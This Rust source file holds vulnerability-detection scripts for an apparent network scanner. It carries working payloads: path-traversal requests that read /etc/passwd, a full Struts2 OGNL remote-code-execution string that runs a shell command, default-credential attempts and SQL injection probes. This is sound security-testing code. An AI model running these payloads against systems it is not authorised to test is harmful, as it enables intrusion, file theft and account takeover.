/// HTTP Vulnerability Detection Scripts
use super::engine::*;
use super::common::*;
use anyhow::Result;
use regex::Regex;

/// CVE-2021-41773 - Apache Path Traversal
pub struct ApachePathTraversal;

#[async_trait::async_trait]
impl Script for ApachePathTraversal {
    fn name(&self) -> &str { "http-vuln-cve2021-41773" }
    fn description(&self) -> &str { "Detects Apache 2.4.49-2.4.50 path traversal vulnerability (CVE-2021-41773)" }
    fn categories(&self) -> Vec<ScriptCategory> {
        vec![ScriptCategory::Vuln, ScriptCategory::Intrusive, ScriptCategory::Exploit]
    }
    fn author(&self) -> &str { "R-Map Contributors" }
    fn license(&self) -> &str { "MIT OR Apache-2.0" }

    fn requires_port(&self) -> bool { true }
    fn requires_service(&self) -> Option<&str> { Some("http") }

    async fn execute(&self, context: &ScriptContext) -> Result<ScriptResult> {
        let port = context.target_port.unwrap_or(80);
        let client = build_http_client()?;

        // Path traversal payload
        let payloads = vec![
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ];

        for payload in payloads {
            let url = format!("http://{}:{}{}", context.target_ip, port, payload);

            match http_request(&client, &url, "GET", 10).await {
                Ok(response) => {
                    let status = response.status();
                    let body = response.text().await.unwrap_or_default();

                    // Check for successful path traversal
                    if status.is_success() && body.contains("root:") {
                        let vuln = Vulnerability {
                            id: "CVE-2021-41773".to_string(),
                            title: "Apache Path Traversal".to_string(),
                            severity: VulnerabilitySeverity::Critical,
                            description: "Apache HTTP Server 2.4.49-2.4.50 allows path traversal and arbitrary file reading".to_string(),
                            references: vec![
                                "https://nvd.nist.gov/vuln/detail/CVE-2021-41773".to_string(),
                            ],
                            cvss_score: Some(7.5),
                        };

                        return Ok(ScriptResult::success(format!(
                            "VULNERABLE: Apache path traversal detected. Payload: {}",
                            payload
                        )).with_vulnerability(vuln));
                    }
                }
                Err(_) => continue,
            }
        }

        Ok(ScriptResult::success("Not vulnerable to CVE-2021-41773".to_string()))
    }
}

/// CVE-2017-5638 - Apache Struts2 RCE
pub struct Struts2RCE;

#[async_trait::async_trait]
impl Script for Struts2RCE {
    fn name(&self) -> &str { "http-vuln-cve2017-5638" }
    fn description(&self) -> &str { "Detects Apache Struts2 RCE vulnerability (CVE-2017-5638)" }
    fn categories(&self) -> Vec<ScriptCategory> {
        vec![ScriptCategory::Vuln, ScriptCategory::Intrusive, ScriptCategory::Exploit]
    }
    fn author(&self) -> &str { "R-Map Contributors" }
    fn license(&self) -> &str { "MIT OR Apache-2.0" }

    fn requires_port(&self) -> bool { true }
    fn requires_service(&self) -> Option<&str> { Some("http") }

    async fn execute(&self, context: &ScriptContext) -> Result<ScriptResult> {
        let port = context.target_port.unwrap_or(80);
        let client = build_http_client()?;

        let url = format!("http://{}:{}/", context.target_ip, port);

        // Struts2 vulnerability test payload - non-destructive
        let test_payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo STRUTS2_VULN').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

        let response = client
            .get(&url)
            .header("Content-Type", test_payload)
            .send()
            .await;

        match response {
            Ok(resp) => {
                let body = resp.text().await.unwrap_or_default();

                if body.contains("STRUTS2_VULN") || body.contains("ognl") {
                    let vuln = Vulnerability {
                        id: "CVE-2017-5638".to_string(),
                        title: "Apache Struts2 Remote Code Execution".to_string(),
                        severity: VulnerabilitySeverity::Critical,
                        description: "Apache Struts2 allows remote code execution via Content-Type header".to_string(),
                        references: vec![
                            "https://nvd.nist.gov/vuln/detail/CVE-2017-5638".to_string(),
                        ],
                        cvss_score: Some(10.0),
                    };

                    return Ok(ScriptResult::success(
                        "VULNERABLE: Apache Struts2 RCE detected".to_string()
                    ).with_vulnerability(vuln));
                }
            }
            Err(_) => {}
        }

        Ok(ScriptResult::success("Not vulnerable to CVE-2017-5638".to_string()))
    }
}

/// HTTP Default Accounts Detection
pub struct HttpDefaultAccounts;

#[async_trait::async_trait]
impl Script for HttpDefaultAccounts {
    fn name(&self) -> &str { "http-default-accounts" }
    fn description(&self) -> &str { "Tests for default credentials on HTTP services" }
    fn categories(&self) -> Vec<ScriptCategory> {
        vec![ScriptCategory::Vuln, ScriptCategory::Auth, ScriptCategory::Intrusive]
    }
    fn author(&self) -> &str { "R-Map Contributors" }
    fn license(&self) -> &str { "MIT OR Apache-2.0" }

    fn requires_port(&self) -> bool { true }
    fn requires_service(&self) -> Option<&str> { Some("http") }

    async fn execute(&self, context: &ScriptContext) -> Result<ScriptResult> {
        let port = context.target_port.unwrap_or(80);
        let client = build_http_client()?;

        // Common default credentials
        let credentials = vec![
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("admin", ""),
            ("administrator", "administrator"),
            ("tomcat", "tomcat"),
        ];

        let paths = vec!["/", "/admin", "/login", "/manager/html"];

        for path in paths {
            for (username, password) in &credentials {
                let url = format!("http://{}:{}{}", context.target_ip, port, path);

                use base64::Engine;
                let auth = base64::engine::general_purpose::STANDARD
                    .encode(format!("{}:{}", username, password));

                match client
                    .get(&url)
                    .header("Authorization", format!("Basic {}", auth))
                    .send()
                    .await
                {
                    Ok(response) => {
                        if response.status().is_success() || response.status() == 200 {
                            let vuln = Vulnerability {
                                id: "DEFAULT-CREDS".to_string(),
                                title: "Default Credentials Detected".to_string(),
                                severity: VulnerabilitySeverity::High,
                                description: format!(
                                    "Default credentials found: {}:{} on path {}",
                                    username, password, path
                                ),
                                references: vec![],
                                cvss_score: Some(9.0),
                            };

                            return Ok(ScriptResult::success(format!(
                                "VULNERABLE: Default credentials accepted - {}:{}",
                                username, password
                            )).with_vulnerability(vuln));
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        Ok(ScriptResult::success("No default credentials found".to_string()))
    }
}

/// Basic SQL Injection Detection
pub struct HttpSQLInjection;

#[async_trait::async_trait]
impl Script for HttpSQLInjection {
    fn name(&self) -> &str { "http-sql-injection" }
    fn description(&self) -> &str { "Basic SQL injection vulnerability detection" }
    fn categories(&self) -> Vec<ScriptCategory> {
        vec![ScriptCategory::Vuln, ScriptCategory::Intrusive]
    }
    fn author(&self) -> &str { "R-Map Contributors" }
    fn license(&self) -> &str { "MIT OR Apache-2.0" }

    fn requires_port(&self) -> bool { true }
    fn requires_service(&self) -> Option<&str> { Some("http") }

    async fn execute(&self, context: &ScriptContext) -> Result<ScriptResult> {
        let port = context.target_port.unwrap_or(80);
        let client = build_http_client()?;

        // SQL injection test payloads (non-destructive)
        let payloads = vec![
            "'",
            "' OR '1'='1",
            "1' OR '1' = '1",
            "admin'--",
            "' OR 1=1--",
        ];

        // SQL error patterns
        let error_patterns = vec![
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
        ];

        for payload in payloads {
            let url = format!("http://{}:{}/?id={}", context.target_ip, port,
                urlencoding::encode(payload));

            match http_request(&client, &url, "GET", 10).await {
                Ok(response) => {
                    let body = response.text().await.unwrap_or_default();

                    for pattern in &error_patterns {
                        if let Ok(re) = Regex::new(pattern) {
                            if re.is_match(&body) {
                                let vuln = Vulnerability {
                                    id: "SQL-INJECTION".to_string(),
                                    title: "SQL Injection Vulnerability".to_string(),
                                    severity: VulnerabilitySeverity::High,
                                    description: format!(
                                        "SQL error detected with payload: {}. Error pattern: {}",
                                        payload, pattern
                                    ),
                                    references: vec![
                                        "https://owasp.org/www-community/attacks/SQL_Injection".to_string(),
                                    ],
                                    cvss_score: Some(8.0),
                                };

                                return Ok(ScriptResult::success(
                                    "VULNERABLE: SQL injection detected".to_string()
                                ).with_vulnerability(vuln));
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        Ok(ScriptResult::success("No SQL injection detected".to_string()))
    }
}

/// HTTP Security Headers Check
pub struct HttpSecurityHeaders;

#[async_trait::async_trait]
impl Script for HttpSecurityHeaders {
    fn name(&self) -> &str { "http-security-headers" }
    fn description(&self) -> &str { "Checks for missing security headers" }
    fn categories(&self) -> Vec<ScriptCategory> {
        vec![ScriptCategory::Vuln, ScriptCategory::Safe, ScriptCategory::Discovery]
    }
    fn author(&self) -> &str { "R-Map Contributors" }
    fn license(&self) -> &str { "MIT OR Apache-2.0" }

    fn requires_port(&self) -> bool { true }
    fn requires_service(&self) -> Option<&str> { Some("http") }

    async fn execute(&self, context: &ScriptContext) -> Result<ScriptResult> {
        let port = context.target_port.unwrap_or(80);
        let client = build_http_client()?;

        let url = format!("http://{}:{}/", context.target_ip, port);

        match http_request(&client, &url, "GET", 10).await {
            Ok(response) => {
                let headers = response.headers();
                let mut missing_headers = Vec::new();
                let mut findings = Vec::new();

                // Check for important security headers
                let security_headers = vec![
                    ("X-Frame-Options", "Clickjacking protection"),
                    ("X-Content-Type-Options", "MIME-sniffing protection"),
                    ("Strict-Transport-Security", "HTTPS enforcement"),
                    ("Content-Security-Policy", "XSS and injection protection"),
                    ("X-XSS-Protection", "XSS filter"),
                ];

                for (header, description) in security_headers {
                    if !headers.contains_key(header) {
                        missing_headers.push(header);
                        findings.push(format!("Missing: {} ({})", header, description));
                    }
                }

                if !missing_headers.is_empty() {
                    let vuln = Vulnerability {
                        id: "MISSING-SECURITY-HEADERS".to_string(),
                        title: "Missing Security Headers".to_string(),
                        severity: VulnerabilitySeverity::Medium,
                        description: format!(
                            "Missing {} security headers: {}",
                            missing_headers.len(),
                            missing_headers.join(", ")
                        ),
                        references: vec![
                            "https://owasp.org/www-project-secure-headers/".to_string(),
                        ],
                        cvss_score: Some(5.0),
                    };

                    return Ok(ScriptResult::success(findings.join("\n"))
                        .with_vulnerability(vuln));
                }

                Ok(ScriptResult::success("All security headers present".to_string()))
            }
            Err(e) => Ok(ScriptResult::failure(format!("Request failed: {}", e))),
        }
    }
}
